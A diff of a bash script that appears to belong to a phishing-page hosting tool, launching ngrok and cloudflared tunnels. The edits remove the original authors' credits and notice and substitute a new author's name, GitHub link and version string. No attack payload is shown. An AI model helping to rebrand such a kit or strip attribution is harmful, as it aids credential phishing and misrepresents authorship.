@@ -72,7 +72,7 @@ banner() {
                   ♖♘♗♔♕♗♘♖
            ${PINK}Version : 0.1
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Amr (ALEX BIEBER)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Amr ${WHITE}
 	EOF
 }
 
@@ -82,7 +82,7 @@ banner_small() {
 		${RED}    ♛ ♛ ♛        ♜   ♜       ♞ ♞ ♞
 		${RED}    ♛   ♛      ♜   ♜   ♜     ♞  ♞ 
 		${RED}    ♛ ♛ ♛     ♜         ♜    ♞ ♞
-		${RED}    ♛   ♛    ♜           ♜   ♞   ♞ WELCOME  !             ${WHITE} 0.2
+		${RED}    ♛   ♛    ♜           ♜   ♞   ♞ WELCOME  !             ${WHITE} 0.1
 	EOF
 }
 
@@ -214,11 +214,11 @@ about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}Amr ${RED}[ ${ORANGE}Amr-J ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/AmrJ1
 		${GREEN}Version  ${RED}:  ${ORANGE}0.1
 
 		${REDBG}${WHITE} Thanks : My^_^
-								  DarkSecDevelopers,Amr,-j ${RESETBG}
+								  you,Amr,-j ${RESETBG}
 
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for nothing purpose ${RED}!${WHITE}
@@ -301,7 +301,7 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Amr  (https://github.com/)
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Amr  (https://github.com/AmrJ1)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -315,7 +315,7 @@ start_ngrok() {
 }
 
 
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
+## DON'T  :')
 
 ## Start Cloudflared
 start_cloudflared() { 
